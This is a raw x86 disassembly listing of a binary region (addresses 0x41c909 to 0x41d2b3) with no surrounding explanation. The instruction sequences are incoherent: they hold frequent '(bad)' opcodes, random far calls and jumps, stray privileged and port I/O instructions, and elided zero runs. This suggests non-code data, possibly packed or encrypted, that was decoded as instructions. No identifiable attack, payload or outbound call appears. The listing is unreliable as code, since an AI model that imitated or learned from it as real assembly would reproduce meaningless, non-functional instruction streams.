  41c909:	add    DWORD PTR [eax],eax
  41c90b:	add    BYTE PTR [esi-0x4e68a444],al
  41c911:	mov    esp,0x537114e4
  41c916:	push   ax
  41c918:	pop    eax
  41c919:	repnz imul ebx,DWORD PTR [esi-0x710abda9],0x1ee854a9
  41c924:	lods   eax,DWORD PTR ds:[esi]
  41c925:	aaa    
  41c926:	sahf   
  41c927:	cwde   
  41c928:	adc    esp,DWORD PTR [ebp+eiz*4-0x51]
  41c92c:	push   ss
  41c92d:	test   BYTE PTR [edi-0x719396dc],0x30
  41c934:	sbb    dh,BYTE PTR [ecx+0xf]
  41c937:	mov    edi,0xee392075
  41c93c:	shl    BYTE PTR [ebp-0x6157f1d2],cl
  41c942:	pop    ss
  41c943:	mov    ch,0xe
  41c945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c946:	test   DWORD PTR [ebp+0x42],ebx
  41c949:	add    al,0x47
  41c94b:	push   ss
  41c94c:	imul   esp,DWORD PTR [ebp+edi*1+0x1e],0x6c474890
  41c954:	jns    0x41c9af
  41c956:	push   esi
  41c957:	retf   0xd04f
  41c95a:	arpl   WORD PTR ds:0xc391ffe2,bp
  41c960:	neg    dl
  41c962:	jge    0x41c9b9
  41c964:	das    
  41c965:	mov    bl,BYTE PTR [esp+eiz*8+0x180742b7]
  41c96c:	inc    esi
  41c96d:	neg    DWORD PTR [edi]
  41c96f:	jo     0x41c9c6
  41c971:	push   ss
  41c972:	pop    eax
  41c973:	mov    ecx,0x4b7b86e7
  41c978:	fdiv   QWORD PTR [eax-0x6e1b00f9]
  41c97e:	(bad)  
  41c97f:	retf   
  41c980:	popf   
  41c981:	push   esp
  41c982:	adc    esi,DWORD PTR [edx-0x3c02985d]
  41c988:	sbb    eax,0xcab82cb3
  41c98d:	or     BYTE PTR [ebp+0x4bc75502],ch
  41c993:	dec    edx
  41c994:	push   esp
  41c995:	xchg   edx,eax
  41c996:	mov    bl,0x3b
  41c998:	div    BYTE PTR [edx]
  41c99a:	inc    edx
  41c99b:	add    DWORD PTR [edi+0x456c39a7],esp
  41c9a1:	int    0x12
  41c9a3:	test   eax,0x81ca6743
  41c9a8:	jae    0x41c98d
  41c9aa:	bound  edi,QWORD PTR [edi]
  41c9ac:	pop    esi
  41c9ad:	adc    eax,0x3f4816f5
  41c9b2:	arpl   WORD PTR [esi-0x5007c814],bx
  41c9b8:	sahf   
  41c9b9:	adc    al,0xb4
  41c9bb:	scas   eax,DWORD PTR es:[edi]
  41c9bc:	call   0xf1b0:0x7c7117b1
  41c9c3:	test   DWORD PTR [edx+esi*8-0x7a],0x9e69a415
  41c9cb:	test   eax,0xd8d3ffea
  41c9d0:	pop    ss
  41c9d1:	(bad)  
  41c9d2:	push   edi
  41c9d3:	add    eax,0x4674f5b
  41c9d8:	aaa    
  41c9d9:	xlat   BYTE PTR ds:[ebx]
  41c9da:	not    BYTE PTR [esi+0x7b428a79]
  41c9e0:	(bad)  
  41c9e1:	enter  0x34a9,0xc3
  41c9e5:	pop    ebp
  41c9e6:	cmp    BYTE PTR [ecx],cl
  41c9e8:	(bad)  
  41c9e9:	jnp    0x41c98b
  41c9eb:	nop
  41c9ec:	repnz xchg edi,eax
  41c9ee:	pop    ebp
  41c9ef:	push   ebp
  41c9f0:	pop    eax
  41c9f1:	adc    al,0x1f
  41c9f4:	repz fistp QWORD PTR [ebp*1+0x616ef9a4]
  41c9fc:	xchg   esi,eax
  41c9fd:	sbb    eax,0xadd97d6a
  41ca02:	int3   
  41ca03:	pop    edi
  41ca04:	dec    eax
  41ca05:	sbb    ebx,DWORD PTR [eax-0x77]
  41ca08:	mov    edx,0x96f67369
  41ca0d:	xchg   ebp,eax
  41ca0e:	xchg   edi,eax
  41ca0f:	into   
  41ca10:	add    BYTE PTR [eax],0x0
	...
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	cdq    
  41ca81:	xor    al,0x2f
  41ca83:	scas   al,BYTE PTR es:[edi]
  41ca84:	lods   eax,DWORD PTR ds:[esi]
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0xa5000001,al
  41ca8d:	sahf   
  41ca8e:	sbb    ebx,DWORD PTR [esi+0x29]
  41ca91:	cmp    al,0x12
  41ca93:	or     ah,BYTE PTR [esi+0x5f]
  41ca96:	xchg   esi,eax
  41ca97:	ret    
  41ca98:	inc    ecx
  41ca99:	in     al,dx
  41ca9a:	add    al,0xaa
  41ca9c:	ror    esi,1
  41ca9e:	push   cs
  41ca9f:	dec    edi
  41caa0:	push   edx
  41caa1:	inc    ebp
  41caa2:	arpl   sp,ax
  41caa4:	cmovl  esp,DWORD PTR [eax-0x3be427e7]
  41caab:	repnz lea ebp,[eax+ebp*2+0x20e39002]
  41cab3:	sub    BYTE PTR [ecx+0x77d15f23],0x8f
  41caba:	push   es
  41cabb:	push   esp
  41cabc:	icebp  
  41cabd:	jmp    0xc10a:0x895350d9
  41cac4:	icebp  
  41cac5:	lahf   
  41cac6:	dec    edx
  41cac7:	lock iret 
  41cac9:	mov    esp,0xb39a7bf
  41cace:	sbb    BYTE PTR [edx-0x3],bl
  41cad1:	fmul   st(6),st
  41cad3:	retf   0x8bec
  41cad6:	data16 mov dl,0x78
  41cad9:	loop   0x41caf5
  41cadb:	dec    eax
  41cadc:	add    eax,0xf36531db
  41cae1:	add    BYTE PTR [edx-0x3d],dl
  41cae4:	xchg   BYTE PTR ds:0x1142a7f3,bl
  41caea:	ficom  WORD PTR [ecx]
  41caec:	lea    ebp,[ebx-0x61]
  41caef:	rcr    DWORD PTR [eax],cl
  41caf1:	inc    esi
  41caf2:	mov    al,ds:0xd5033e9d
  41caf7:	cwde   
  41caf8:	dec    edx
  41caf9:	popa   
  41cafa:	mov    bl,0x66
  41cafc:	(bad)  
  41cafd:	pop    eax
  41cafe:	and    al,0x4
  41cb00:	data16 not dh
  41cb03:	test   eax,0x62be2eb5
  41cb08:	imul   esp,ebp,0x61
  41cb0b:	cli    
  41cb0c:	ret    
  41cb0d:	dec    esp
  41cb0e:	hlt    
  41cb0f:	mov    ch,0x38
  41cb11:	clc    
  41cb12:	fsubr  QWORD PTR [esi]
  41cb14:	mov    al,ds:0xec4878cb
  41cb19:	jecxz  0x41ca9d
  41cb1b:	scas   eax,DWORD PTR es:[edi]
  41cb1c:	jge    0x41cb3d
  41cb1e:	cmp    cl,BYTE PTR [eax+ebx*4+0x1e]
  41cb22:	jmp    0x41cb12
  41cb24:	dec    esi
  41cb25:	xchg   edx,eax
  41cb26:	xlat   BYTE PTR ds:[ebx]
  41cb27:	retf   
  41cb28:	pop    ss
  41cb29:	lock add ebp,esp
  41cb2c:	(bad)  
  41cb2e:	sbb    eax,0x4c294079
  41cb33:	mov    BYTE PTR [ecx],ah
  41cb35:	adc    eax,DWORD PTR [eax+0x1c]
  41cb38:	xchg   DWORD PTR [esi+0x1f23f7ec],ecx
  41cb3e:	fild   WORD PTR [esi+0x20]
  41cb41:	mov    al,ds:0xc8edf362
  41cb46:	xor    DWORD PTR [esi-0x44],ecx
  41cb49:	aas    
  41cb4a:	aam    0xc8
  41cb4c:	cmp    BYTE PTR [eax+0x7f05d2f4],dl
  41cb52:	rcl    BYTE PTR [edi+0x24e6688],cl
  41cb58:	dec    ebp
  41cb59:	mov    edi,0xc49849f0
  41cb5e:	lods   al,BYTE PTR ds:[esi]
  41cb5f:	jno    0x41cb69
  41cb61:	mov    al,0x95
  41cb63:	hlt    
  41cb64:	pop    ss
  41cb65:	xchg   esi,eax
  41cb66:	xchg   BYTE PTR [edi+0x78],bl
  41cb69:	pop    es
  41cb6a:	stos   BYTE PTR es:[edi],al
  41cb6b:	loopne 0x41cb08
  41cb6d:	rcr    DWORD PTR [ecx],0x80
  41cb70:	loopne 0x41cb30
  41cb72:	hlt    
  41cb73:	fisubr DWORD PTR [ebp+0x6]
  41cb76:	fbstp  TBYTE PTR [edx]
  41cb78:	mov    cl,0x86
  41cb7a:	fmul   st(2),st
  41cb7c:	xor    esi,ecx
  41cb7e:	dec    ecx
  41cb7f:	hlt    
  41cb80:	sub    DWORD PTR [edi+ecx*2],esi
  41cb83:	mov    esp,0xe682962c
  41cb88:	sub    BYTE PTR [edx-0x201bd484],dl
  41cb8e:	int3   
  41cb8f:	into   
  41cb90:	jns    0x41cb92
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x24ff622
  41cc03:	loope  0x41cbb7
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR ds:0xcb000001,al
  41cc0d:	push   edi
  41cc0e:	(bad)  
  41cc0f:	stos   BYTE PTR es:[edi],al
  41cc10:	mov    edi,0xf4c595d4
  41cc15:	or     eax,0x76c5ec93
  41cc1a:	int    0xdd
  41cc1c:	outs   dx,DWORD PTR ds:[esi]
  41cc1d:	es call 0x5577d713
  41cc23:	fwait
  41cc24:	adc    bl,bl
  41cc26:	and    bl,cl
  41cc28:	pop    ds
  41cc29:	inc    ecx
  41cc2a:	sub    BYTE PTR [ebx-0x4b],0xb
  41cc2e:	loopne 0x41cca6
  41cc30:	cmp    eax,0xcc3ca5ca
  41cc35:	fmul   st(4),st
  41cc37:	pop    ebx
  41cc38:	mul    bh
  41cc3a:	xor    DWORD PTR [ecx+0xc],0x2d
  41cc3e:	or     bh,bh
  41cc40:	pop    ebx
  41cc41:	push   eax
  41cc42:	rol    DWORD PTR [eax-0x22fccca1],cl
  41cc48:	add    cl,BYTE PTR [ecx]
  41cc4a:	ja     0x41ccb4
  41cc4c:	pop    ecx
  41cc4d:	mov    edx,0xeb92dda7
  41cc52:	scas   eax,DWORD PTR es:[edi]
  41cc53:	xor    al,0x47
  41cc55:	(bad)  
  41cc56:	stc    
  41cc57:	jo     0x41cc47
  41cc59:	xchg   edi,eax
  41cc5a:	fwait
  41cc5b:	ret    0x913b
  41cc5e:	jmp    0x8627c497
  41cc63:	jmp    0x41ccc4
  41cc65:	cmp    DWORD PTR [ebp+edx*1+0x35078b42],ebp
  41cc6c:	jmp    0x41ccca
  41cc6e:	pop    ebx
  41cc6f:	mov    DWORD PTR [ebx-0x2d915884],ebp
  41cc75:	mov    esp,0x5277d21b
  41cc7a:	add    eax,0x9302e2a5
  41cc7f:	push   esp
  41cc80:	cdq    
  41cc81:	dec    edi
  41cc82:	sub    BYTE PTR [edi-0x5f],dl
  41cc85:	ficomp WORD PTR [edi+0x19]
  41cc88:	inc    eax
  41cc89:	xchg   edx,eax
  41cc8a:	cs inc ebx
  41cc8c:	add    ch,dl
  41cc8e:	pushf  
  41cc8f:	mov    WORD PTR [esi-0x7d],es
  41cc92:	mov    esi,0xd88e6108
  41cc97:	push   eax
  41cc98:	out    0x34,eax
  41cc9a:	rcr    BYTE PTR [edx+eax*2+0x3bfd7edc],0xe7
  41cca2:	mov    esi,0x56575ea8
  41cca7:	mov    DWORD PTR [esp-0x350f8c47],edi
  41ccae:	jnp    0x41cd20
  41ccb0:	(bad)  
  41ccb1:	mov    ch,0x5d
  41ccb3:	lock jbe 0x41cc56
  41ccb6:	xlat   BYTE PTR ds:[ebx]
  41ccb7:	repz je 0x41cc79
  41ccba:	iret   
  41ccbb:	dec    eax
  41ccbc:	sti    
  41ccbd:	gs jns 0x41ccc0
  41ccc0:	jl     0x41cc6a
  41ccc2:	xchg   esi,eax
  41ccc3:	cdq    
  41ccc4:	mov    ebx,edx
  41ccc6:	mov    WORD PTR [edi],fs
  41ccc8:	repz fistp WORD PTR [edx+0x7ac9cec5]
  41cccf:	mov    eax,eax
  41ccd1:	mov    ebp,0x837a423b
  41ccd6:	jb     0x41cc59
  41ccd8:	cmc    
  41ccd9:	pop    ecx
  41ccda:	shl    DWORD PTR [edx],0x2d
  41ccdd:	inc    edi
  41ccde:	repz push esp
  41cce0:	(bad)  
  41cce1:	call   FWORD PTR [ebp+0x10f5b7e7]
  41cce7:	jnp    0x41cd0e
  41cce9:	cwde   
  41ccea:	div    BYTE PTR [edx+0x7c]
  41cced:	sbb    ebx,DWORD PTR [eax]
  41ccef:	(bad)  
  41ccf0:	inc    BYTE PTR [ebp-0x42c8e361]
  41ccf6:	jmp    0xb5dc25a2
  41ccfb:	aas    
  41ccfc:	jp     0x41cc83
  41ccfe:	out    dx,eax
  41ccff:	int3   
  41cd00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd01:	pop    DWORD PTR [ebp+0x40b5a01b]
  41cd07:	mov    esp,0x500448b7
  41cd0c:	rcr    BYTE PTR [eax],cl
  41cd0e:	mov    bl,0x19
  41cd10:	jbe    0x41cd12
	...
  41cd72:	add    BYTE PTR [eax],al
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	mov    edi,0xb71fd573
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR ds:0x11000001,al
  41cd8d:	ja     0x41cd3e
  41cd8f:	sti    
  41cd90:	xchg   esp,eax
  41cd91:	stc    
  41cd92:	cmp    eax,0x960f4596
  41cd97:	cs aam 0xdc
  41cd9a:	shr    BYTE PTR [ebp-0x29],1
  41cd9d:	ja     0x41cdcd
  41cd9f:	add    al,0xa9
  41cda1:	xchg   BYTE PTR [esi],dh
  41cda3:	ins    BYTE PTR es:[edi],dx
  41cda4:	pop    ss
  41cda5:	mov    ch,0x55
  41cda7:	fidivr WORD PTR ds:0x9363211
  41cdad:	mov    ds:0xa89cccf2,eax
  41cdb2:	push   cs
  41cdb3:	bound  eax,QWORD PTR [ebx+eiz*8]
  41cdb6:	push   ecx
  41cdb7:	sub    bl,BYTE PTR [eax]
  41cdb9:	xor    bh,BYTE PTR [edx]
  41cdbb:	sahf   
  41cdbc:	push   eax
  41cdbd:	add    esi,DWORD PTR [ebp+0x5de361d3]
  41cdc3:	ret    0xf7a5
  41cdc6:	mov    dl,0x66
  41cdc8:	ror    eax,1
  41cdca:	loopne 0x41cd4d
  41cdcc:	mov    bl,0x3c
  41cdce:	adc    dh,BYTE PTR [ebx-0x26]
  41cdd1:	(bad)  
  41cdd2:	arpl   WORD PTR [ebx-0x5e1242c5],dx
  41cdd8:	test   al,0x14
  41cdda:	imul   edx,DWORD PTR [ecx],0x12e83b1
  41cde0:	shr    DWORD PTR [esi-0x544919c2],cl
  41cde6:	jnp    0x41cd98
  41cde8:	repz daa 
  41cdea:	add    BYTE PTR [eax+0x6d],bh
  41cded:	imul   ebx,DWORD PTR [edi],0x50
  41cdf0:	es push edi
  41cdf2:	loopne 0x41ce40
  41cdf4:	das    
  41cdf5:	or     eax,DWORD PTR [ebp-0x7298020d]
  41cdfb:	push   eax
  41cdfc:	scas   eax,DWORD PTR es:[edi]
  41cdfd:	rol    DWORD PTR [ebx-0x4a],1
  41ce00:	mov    esp,0x6df28530
  41ce05:	in     al,dx
  41ce06:	cld    
  41ce07:	popf   
  41ce08:	or     al,0xad
  41ce0a:	lock (bad) 
  41ce0c:	hlt    
  41ce0d:	and    BYTE PTR [ecx],ch
  41ce0f:	inc    esp
  41ce11:	ror    BYTE PTR [esi],1
  41ce13:	mov    al,0xc8
  41ce15:	ret    
  41ce16:	or     BYTE PTR [ebp-0x3bb82e99],bl
  41ce1c:	idiv   DWORD PTR [esi+0x57afc6ce]
  41ce22:	loop   0x41ce54
  41ce24:	aam    0x93
  41ce26:	popa   
  41ce27:	dec    esi
  41ce28:	pop    ss
  41ce29:	iret   
  41ce2a:	mov    DWORD PTR [eax],ebx
  41ce2c:	inc    eax
  41ce2d:	sbb    ebx,0xffffffdb
  41ce30:	mov    ah,0x44
  41ce32:	stos   DWORD PTR es:[edi],eax
  41ce33:	lds    esi,FWORD PTR [ebx+0x30]
  41ce36:	xchg   esp,eax
  41ce37:	dec    ebp
  41ce38:	push   edi
  41ce39:	pushf  
  41ce3a:	sub    esi,DWORD PTR [esi-0x69dccfdf]
  41ce40:	inc    ebp
  41ce41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce42:	sbb    eax,0xb6f9b305
  41ce47:	mov    ebp,0xe62ed6e3
  41ce4c:	aad    0xee
  41ce4e:	sub    al,0x3b
  41ce50:	sbb    DWORD PTR [esi+0x4f5daf21],edx
  41ce56:	push   edi
  41ce57:	jb     0x41ce95
  41ce59:	or     bl,BYTE PTR [ebp-0x3abf2632]
  41ce5f:	rol    eax,0x19
  41ce62:	push   edi
  41ce63:	pop    edx
  41ce64:	or     eax,0x991ae8e6
  41ce69:	(bad)  
  41ce6a:	xchg   ecx,eax
  41ce6b:	pop    ds
  41ce6c:	sbb    eax,0xa30feeac
  41ce71:	int    0x85
  41ce73:	cld    
  41ce74:	add    DWORD PTR [ebp-0x31],ebp
  41ce77:	imul   ecx,DWORD PTR [ebp*4-0x55c89986],0x147a29f6
  41ce82:	or     al,0xa4
  41ce84:	inc    edx
  41ce85:	fist   WORD PTR [ebx+edx*4]
  41ce88:	(bad)  
  41ce89:	mov    ecx,0xab7f16f4
  41ce8e:	sahf   
  41ce8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce90:	inc    edi
	...
  41cef1:	add    BYTE PTR [eax],al
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	sbb    edx,ecx
  41cf02:	lea    edx,[esp+edi*4+0x33]
  41cf06:	add    DWORD PTR [eax],eax
  41cf08:	add    eax,0x7a000001
  41cf0d:	enter  0xa99d,0xf1
  41cf11:	cmp    eax,ebp
  41cf13:	into   
  41cf14:	ret    0xff88
  41cf17:	int3   
  41cf18:	jne    0x41cf2d
  41cf1a:	push   eax
  41cf1b:	mov    ebp,0x187d949c
  41cf20:	ret    
  41cf21:	cmp    bl,cl
  41cf23:	dec    edx
  41cf24:	bound  ecx,QWORD PTR [esi-0x66]
  41cf27:	aaa    
  41cf28:	push   edx
  41cf29:	retf   0x1c1a
  41cf2c:	adc    ebp,ebp
  41cf2e:	add    dl,BYTE PTR [eax]
  41cf30:	out    dx,al
  41cf31:	push   ss
  41cf32:	lock (bad) 
  41cf34:	and    al,0x6d
  41cf36:	dec    edi
  41cf37:	adc    eax,0xad78047c
  41cf3c:	(bad)  
  41cf3e:	push   0x29
  41cf40:	iret   
  41cf41:	lds    esi,FWORD PTR [eax-0x232e3084]
  41cf47:	xor    BYTE PTR [eax],ch
  41cf49:	repz sar BYTE PTR [eax],1
  41cf4c:	lds    esp,FWORD PTR [eax]
  41cf4e:	jp     0x41cf42
  41cf50:	sbb    bh,bl
  41cf52:	test   BYTE PTR [ebp+0x8],ch
  41cf55:	add    DWORD PTR [edx+0x667c950e],esi
  41cf5b:	mov    esp,0x54c26bd7
  41cf60:	jo     0x41cf0e
  41cf62:	in     eax,dx
  41cf63:	cmp    BYTE PTR [eax+0x48fd056f],bl
  41cf69:	xchg   esp,eax
  41cf6a:	pushf  
  41cf6b:	xor    al,0x9a
  41cf6d:	mov    al,ds:0x429c142f
  41cf72:	mov    fs,WORD PTR [esi-0x58]
  41cf75:	ficomp DWORD PTR [esi+esi*2]
  41cf78:	sbb    esp,edi
  41cf7a:	dec    edx
  41cf7b:	inc    ebp
  41cf7c:	and    eax,DWORD PTR [esp+ebx*4]
  41cf7f:	sbb    eax,DWORD PTR [edi]
  41cf81:	pop    edx
  41cf82:	call   0x5660:0x27ee8128
  41cf89:	(bad)  
  41cf8a:	xchg   ebp,eax
  41cf8b:	int3   
  41cf8c:	fwait
  41cf8d:	dec    edx
  41cf8e:	cdq    
  41cf8f:	repnz sbb DWORD PTR [ebp-0x3e],edx
  41cf93:	push   0xffffffa4
  41cf95:	mov    cl,0x51
  41cf97:	outs   dx,DWORD PTR ds:[esi]
  41cf98:	not    DWORD PTR [edi+0x4c]
  41cf9b:	xchg   ebx,eax
  41cf9c:	xchg   edx,eax
  41cf9d:	cmp    sp,WORD PTR [ecx+0x7b54c561]
  41cfa4:	mov    edx,0xde833faf
  41cfa9:	cdq    
  41cfaa:	test   DWORD PTR [edi],eax
  41cfac:	sbb    DWORD PTR [ebx-0x4a32f400],edi
  41cfb2:	fist   WORD PTR [esi]
  41cfb4:	push   cs
  41cfb5:	aas    
  41cfb6:	and    al,0xb7
  41cfb8:	mov    eax,0x5596d7c2
  41cfbd:	aam    0x8d
  41cfbf:	ins    BYTE PTR es:[edi],dx
  41cfc0:	div    DWORD PTR [esi]
  41cfc2:	pop    DWORD PTR [ecx]
  41cfc4:	sbb    eax,0x7279dcc1
  41cfc9:	bound  esi,QWORD PTR [edi-0x7c]
  41cfcc:	fisub  DWORD PTR [eax]
  41cfce:	inc    ebx
  41cfcf:	xlat   BYTE PTR ds:[ebx]
  41cfd0:	sub    dl,BYTE PTR [eax+0x4f]
  41cfd3:	mov    ds:0x18c2a921,al
  41cfd8:	add    BYTE PTR [ebp+0x7d0d81c1],0x24
  41cfdf:	xor    BYTE PTR [ebp-0x33e62df9],bl
  41cfe5:	jbe    0x41cfc6
  41cfe7:	xchg   edi,eax
  41cfe8:	xchg   ecx,eax
  41cfe9:	sbb    esi,DWORD PTR [ecx+0x77e0a61b]
  41cfef:	cmp    ch,BYTE PTR [ecx]
  41cff1:	hlt    
  41cff2:	pop    esp
  41cff3:	(bad)
  41cff6:	mov    ah,BYTE PTR [ecx+0x31]
  41cff9:	mov    esi,0x64d66d8a
  41cffe:	sbb    BYTE PTR ds:0x81629d14,bl
  41d004:	mov    dl,BYTE PTR [eax+0x19]
  41d007:	sbb    ebp,DWORD PTR [eax+0x5c1fd9ca]
  41d00d:	clc    
  41d00e:	and    eax,DWORD PTR [esi+0xf5]
	...
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xc6bf92bd
  41d083:	jp     0x41d046
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR ds:0xd8000001,al
  41d08d:	sahf   
  41d08e:	mov    bh,0xde
  41d090:	das    
  41d091:	sub    eax,0x53cf6e0
  41d096:	ds lock jo 0x41d043
  41d09a:	out    dx,eax
  41d09b:	push   ss
  41d09c:	or     eax,0x9949d52
  41d0a1:	jo     0x41d03c
  41d0a3:	or     eax,0x6ae1143d
  41d0a8:	lar    ebx,ax
  41d0ab:	popa   
  41d0ac:	les    esi,FWORD PTR [ecx+0x7]
  41d0af:	adc    edx,0xa7475a72
  41d0b5:	aam    0xe4
  41d0b7:	inc    DWORD PTR [ebx]
  41d0b9:	and    eax,0xf4f23508
  41d0be:	mov    edx,0x18a2f4c5
  41d0c3:	lea    edx,[ecx]
  41d0c5:	imul   esi,edi,0xe49fa78d
  41d0cb:	pop    ebp
  41d0cc:	sbb    DWORD PTR [ebx+0x330f06d0],edi
  41d0d2:	xchg   ebp,eax
  41d0d3:	aas    
  41d0d4:	lea    edi,[esi]
  41d0d6:	fwait
  41d0d7:	jns    0x41d129
  41d0d9:	mov    ds:0xa0a3800d,al
  41d0de:	test   eax,0xeeaf6396
  41d0e3:	out    0x3b,eax
  41d0e5:	sahf   
  41d0e6:	jmp    FWORD PTR [edx]
  41d0e8:	sub    DWORD PTR [edx+0x764d17ce],ebx
  41d0ee:	mov    edx,DWORD PTR [esi]
  41d0f0:	shl    BYTE PTR [edi-0x33d37c29],0x1d
  41d0f7:	push   edx
  41d0f8:	fs or  al,0x4e
  41d0fb:	xchg   BYTE PTR [eax-0x691403ed],ah
  41d101:	ror    BYTE PTR [ebx-0xd],0x47
  41d105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d106:	pop    ecx
  41d107:	push   esi
  41d108:	cmp    BYTE PTR [ecx-0x69746b67],0x93
  41d10f:	hlt    
  41d110:	(bad)  
  41d111:	loop   0x41d093
  41d113:	shl    DWORD PTR [esi],0x7c
  41d116:	pop    eax
  41d117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d118:	aad    0x1c
  41d11a:	js     0x41d139
  41d11c:	inc    ecx
  41d11d:	push   0x651590c5
  41d122:	and    ch,BYTE PTR [esi]
  41d124:	pop    es
  41d125:	es or  ebp,0x1b
  41d129:	sub    DWORD PTR [ecx],ebx
  41d12b:	inc    ecx
  41d12c:	mov    al,ds:0x6e432f29
  41d131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d132:	add    cl,BYTE PTR [eax-0x31]
  41d135:	xor    DWORD PTR [edx-0x57],ebp
  41d138:	adc    eax,0x918ce7b4
  41d13d:	aaa    
  41d13e:	mov    DWORD PTR [eax],ebp
  41d140:	xchg   ecx,eax
  41d141:	out    dx,eax
  41d142:	lahf   
  41d143:	mov    gs,WORD PTR [esi+0x728a5f71]
  41d149:	mov    ds:0x7ea5f26f,al
  41d14e:	inc    esp
  41d14f:	fst    DWORD PTR [edi+0x494bd1fa]
  41d155:	int    0x27
  41d157:	jns    0x41d163
  41d159:	ins    DWORD PTR es:[edi],dx
  41d15a:	ins    BYTE PTR es:[edi],dx
  41d15b:	repnz int3 
  41d15d:	cmp    dl,0xbe
  41d160:	inc    edi
  41d161:	xchg   ecx,eax
  41d162:	ja     0x41d1e2
  41d164:	fsubr  QWORD PTR [edi+0x2b]
  41d167:	loope  0x41d186
  41d169:	popf   
  41d16a:	jbe    0x41d19a
  41d16c:	cwde   
  41d16d:	push   ds
  41d16e:	fstp   DWORD PTR [ebp+edi*1-0x3d07c600]
  41d175:	pop    esp
  41d176:	clc    
  41d177:	and    esp,DWORD PTR [edi]
  41d179:	repnz push edi
  41d17b:	test   BYTE PTR [edi],dh
  41d17d:	imul   eax,DWORD PTR [ebx-0x25],0xffffffa7
  41d181:	push   cs
  41d182:	lahf   
  41d183:	or     al,0x25
  41d185:	popf   
  41d186:	stos   BYTE PTR es:[edi],al
  41d187:	std    
  41d188:	(bad)  
  41d189:	pop    esi
  41d18a:	pop    esi
  41d18b:	sar    BYTE PTR [ebx],0xe7
  41d18e:	and    DWORD PTR [esp+edx*4+0x0],ebp
	...
  41d1f2:	add    BYTE PTR [eax],al
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d201:	loop   0x41d238
  41d203:	mov    al,dh
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	cmp    bh,al
  41d20e:	dec    ecx
  41d20f:	leave  
  41d210:	dec    eax
  41d211:	jne    0x41d1af
  41d213:	mov    ch,0x6f
  41d215:	jmp    0x41d241
  41d217:	adc    dl,BYTE PTR [edi]
  41d219:	sahf   
  41d21a:	(bad)  
  41d21b:	lgs    eax,FWORD PTR [edi]
  41d21e:	mov    edi,0x2bf691e4
  41d223:	arpl   bp,cx
  41d225:	rol    DWORD PTR [edi+0x2c1b383b],0xbd
  41d22c:	iret   
  41d22d:	xchg   DWORD PTR [esi],ebx
  41d22f:	fsubp  st(7),st
  41d231:	retf   0x523a
  41d234:	push   0x54d6d4b6
  41d239:	bound  ebx,QWORD PTR [edx]
  41d23b:	imul   ebp,DWORD PTR [esi+0x225e823f],0xffffff91
  41d242:	push   esp
  41d243:	push   0xffffffe8
  41d245:	test   bh,dl
  41d247:	aaa    
  41d248:	sub    esp,esi
  41d24a:	shl    DWORD PTR [edx],1
  41d24c:	in     eax,dx
  41d24d:	push   es
  41d24e:	or     eax,0x89351c3d
  41d253:	mov    ah,0xe4
  41d255:	cld    
  41d256:	daa    
  41d257:	frstor ds:0x87dcbaf8
  41d25d:	cmp    dh,BYTE PTR [ebx-0x5b93819a]
  41d263:	and    dl,BYTE PTR ds:0x32cb2370
  41d269:	mov    eax,0x4f2c9e8d
  41d26e:	mov    bl,0xeb
  41d270:	popf   
  41d271:	cmp    BYTE PTR [eax],ah
  41d273:	fimul  DWORD PTR [ebx+0x8]
  41d276:	xor    esi,0xb
  41d279:	call   0x329d:0x3a771e5f
  41d280:	stos   BYTE PTR es:[edi],al
  41d281:	call   0xb3e36fc0
  41d286:	cmp    ebp,eax
  41d288:	jnp    0x41d2a2
  41d28a:	mov    ah,bl
  41d28c:	data16 test BYTE PTR [edx-0x1d],ch
  41d290:	mov    ds:0x152ec49b,eax
  41d295:	cmp    al,0x35
  41d297:	ins    DWORD PTR es:[edi],dx
  41d298:	jae    0x41d282
  41d29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d29b:	jmp    0xb7b8:0x42c8aa41
  41d2a2:	cdq    
  41d2a3:	and    DWORD PTR [edi],esp
  41d2a5:	loope  0x41d296
  41d2a7:	jp     0x41d2c8
  41d2a9:	fisub  WORD PTR [ebx]
  41d2ab:	dec    edx
  41d2ac:	popf   
  41d2ad:	aaa    
  41d2ae:	(bad)  
  41d2af:	ins    BYTE PTR es:[edi],dx
  41d2b0:	arpl   WORD PTR [eax],si
  41d2b2:	ins    DWORD PTR es:[edi],dx
  41d2b3:	jle    0x41d2e6
